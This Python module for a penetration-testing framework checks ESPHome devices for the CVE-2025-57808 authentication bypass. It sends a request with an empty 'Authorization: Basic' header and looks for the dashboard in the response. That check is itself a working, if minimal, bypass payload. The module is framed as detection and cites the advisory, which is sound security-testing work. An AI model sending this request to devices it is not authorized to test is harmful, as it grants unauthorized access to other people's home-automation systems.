#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ESPHome 2025."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ESPHome - Authentication Bypass Detection',
        'description': 'ESPHome 2025.8.0 contains an authentication bypass caused by improper validation of base64-encoded Authorization values in the web_server component, letting attackers access functionality without valid credentials, exploit requires crafted Authorization header.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'auth-bypass', 'esphome', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://cybersecuritynews.com/esphome-web-server-authentication-bypass/',
            'https://github.com/esphome/esphome/security/advisories/GHSA-mxh2-ccgj-8635',
            'https://esphome.io/components/web_server/',
        ],
        'cve': 'CVE-2025-57808',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=True)
        if not r:
            return False
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Authorization': 'Basic'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Dashboard - ESPHome',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='ESPHome - Authentication Bypass detected', path=path)
            return True
        return False

